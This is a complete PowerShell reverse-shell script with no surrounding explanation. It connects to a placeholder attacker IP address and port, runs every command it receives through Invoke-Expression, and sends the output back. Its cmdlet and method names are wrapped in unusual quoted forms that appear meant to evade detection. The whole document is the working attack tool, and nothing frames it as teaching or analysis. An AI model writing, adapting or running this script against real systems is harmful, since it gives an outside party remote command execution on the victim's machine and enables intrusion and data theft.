$ATTACKER = & (\New-Object\) (\System.Net.Sockets.TCPClient\)((\IPADDRESS\), (\PORTADDRESS\))

$STREAM = $ATTACKER.(\GetStream\)()

$BUFFER = & (\New-Object\) (\Byte[]\) (\65535\)

while (($total_bytes_read = $STREAM.(\Read\)($BUFFER, 0, $BUFFER.(\Length\))) -ne 0) {

$DECODED_COMMAND = [System.Text.Encoding]::ASCII.GetString($BUFFER, 0, $total_bytes_read)
$EXECUTED_COMMAND = & (\Invoke-Expression\) $DECODED_COMMAND | & (\Out-String\)
$FULL_OUTPUT = $EXECUTED_COMMAND + (\PS \) +  $($(pwd).(\path\)) + (\> \)
$ENCODED_OUTPUT = [text.encoding]::ASCII.(\GetBytes\)($FULL_OUTPUT)
$STREAM.(\Write\)($ENCODED_OUTPUT, 0, $ENCODED_OUTPUT.(\Length\))
$STREAM.(\Flush\)()

}

$ATTACKER.Close()